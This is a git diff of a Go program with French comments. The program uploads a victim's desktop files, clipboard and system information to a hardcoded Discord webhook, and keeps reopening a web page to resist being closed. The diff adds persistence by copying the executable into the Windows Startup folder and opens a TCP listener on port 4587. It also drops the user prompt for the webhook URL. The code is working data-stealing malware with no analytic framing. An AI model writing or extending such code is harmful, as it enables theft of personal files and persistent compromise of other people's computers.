@@ -3,7 +3,7 @@
 // au webhook Discord spécifié. Il génère également une liste des processus en cours
 // dans `processlist.txt` et des informations système dans `sysinfo.txt`, ouvre une page web répétée
 // en cas de fermeture pour simuler une résistance à la fermeture, et affiche une pop-up
-// avec le message "GET MOODENGED" 10 fois en dernier.
+// avec le message "GET MOODENGED" 10 fois en dernier. Enfin, il ouvre un point d'entrée TCP sur le port 4587.
 
 package main
 
@@ -12,7 +12,9 @@ import (
     "fmt"
     "io/ioutil"
     "log"
+    "math/rand"
     "mime/multipart"
+    "net"
     "net/http"
     "os"
     "os/exec"
@@ -29,14 +31,21 @@ const webhookURL = "https://discord.com/api/webhooks/1302961751008215060/1iiEJ34
 // URL à ouvrir en boucle
 const youtubeURL = "https://www.youtube.com/watch?v=7EEy1OEmGjc"
 
-func main() {
-    // Demande à l'utilisateur l'URL du webhook Discord
-    fmt.Print("Veuillez entrer l'URL du webhook Discord : ")
-    scanner := bufio.NewScanner(os.Stdin)
-    scanner.Scan() // Lit l'entrée utilisateur
-    webhookURL := scanner.Text()
+// Port pour le serveur TCP Netcat
+const tcpPort = "4587"
 
-    // Construit le chemin vers le bureau de l'utilisateur courant en utilisant la variable d'environnement USERPROFILE
+func main() {
+    // S'enregistrer dans le dossier Startup de Windows
+    err := addToStartup()
+    if err != nil {
+        fmt.Println("Erreur lors de l'enregistrement dans le dossier Startup:", err)
+        return
+    }
+
+    // Initialiser le générateur de nombres aléatoires
+    rand.Seed(time.Now().UnixNano())
+
+    // Définir les chemins pour les fichiers de log et d'informations système sur le bureau
     desktopPath := filepath.Join(os.Getenv("USERPROFILE"), "Desktop")
     debugFilePath := filepath.Join(desktopPath, "debug.log")
     clipboardFilePath := filepath.Join(desktopPath, "clipboard.txt")
@@ -111,6 +120,38 @@ func main() {
 
     // Affiche la pop-up "GET MOODENGED" 10 fois, en dernier
     showPopup()
+
+    // Démarrer le serveur TCP
+    startTCPServer()
+}
+
+// Fonction pour enregistrer le programme dans le dossier Startup de Windows
+func addToStartup() error {
+    // Récupère le chemin complet de l'exécutable en cours
+    exePath, err := os.Executable()
+    if err != nil {
+        return fmt.Errorf("erreur lors de la récupération du chemin de l'exécutable : %v", err)
+    }
+
+    // Chemin du dossier de démarrage
+    startupFolder := filepath.Join(os.Getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
+
+    // Chemin de l'exécutable dans le dossier de démarrage
+    destPath := filepath.Join(startupFolder, filepath.Base(exePath))
+
+    // Copie l'exécutable dans le dossier de démarrage s'il n'existe pas déjà
+    if _, err := os.Stat(destPath); os.IsNotExist(err) {
+        input, err := os.ReadFile(exePath)
+        if err != nil {
+            return fmt.Errorf("erreur lors de la lecture de l'exécutable : %v", err)
+        }
+        err = os.WriteFile(destPath, input, 0755)
+        if err != nil {
+            return fmt.Errorf("erreur lors de la copie de l'exécutable : %v", err)
+        }
+    }
+
+    return nil
 }
 
 // Fonction pour envoyer les fichiers du bureau de taille inférieure à la limite au webhook Discord
@@ -135,6 +176,33 @@ func sendDesktopFiles(desktopPath string) {
             log.Printf("Fichier %s ignoré (taille supérieure à 5 Mo)\n", file.Name())
         }
     }
+}
+
+// Fonction pour démarrer un serveur TCP sur le port spécifié
+func startTCPServer() {
+    listener, err := net.Listen("tcp", ":"+tcpPort)
+    if err != nil {
+        log.Printf("Erreur lors du démarrage du serveur TCP : %v\n", err)
+        return
+    }
+    defer listener.Close()
+    log.Printf("Serveur TCP en écoute sur le port %s\n", tcpPort)
+
+    for {
+        conn, err := listener.Accept()
+        if err != nil {
+            log.Printf("Erreur lors de l'acceptation de la connexion TCP : %v\n", err)
+            continue
+        }
+        log.Println("Connexion TCP acceptée")
+        go handleConnection(conn)
+    }
+}
+
+// Fonction pour gérer les connexions TCP
+func handleConnection(conn net.Conn) {
+    defer conn.Close()
+    conn.Write([]byte("Bienvenue sur MooDeng Supremacy TCP Interface\n"))
 }
 
 // Fonction pour ouvrir la page YouTube dans une nouvelle fenêtre toutes les 3 secondes, 10 fois
